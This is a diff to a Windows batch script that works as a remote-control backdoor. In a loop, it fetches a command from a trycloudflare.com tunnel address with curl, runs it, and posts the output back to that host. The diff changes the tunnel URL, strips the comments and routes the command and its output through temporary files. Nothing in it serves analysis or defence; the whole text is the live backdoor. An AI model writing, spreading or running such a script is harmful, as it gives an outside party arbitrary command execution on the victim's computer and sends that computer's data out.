@@ -1,20 +1,17 @@
 @echo off
-set URL=https://mph-politics-blind-emerging.trycloudflare.com
+set URL=https://acne-cbs-submitting-commander.trycloudflare.com
 
 :loop
-    rem Wait 0.5 seconds (approx) using ping trick
     ping -n 1 127.0.0.1 >nul
-
-    rem Get command from server
-    for /f "usebackq delims=" %%A in (`curl -s %URL%`) do set CMD=%%A
-
+    
+    curl -s %URL% > cmd.txt 2>nul
+    set /p CMD=<cmd.txt
+    
     if "%CMD%"=="" goto loop
-
-    rem Execute command and capture output
+    
     for /f "delims=" %%O in ('%CMD% 2^>^&1') do (
-        curl -X POST -d "%%O" %URL%
+        echo %%O > output.txt
+        curl -X POST --data-binary @output.txt %URL% 2>nul
     )
-
+    
     goto loop
-
-
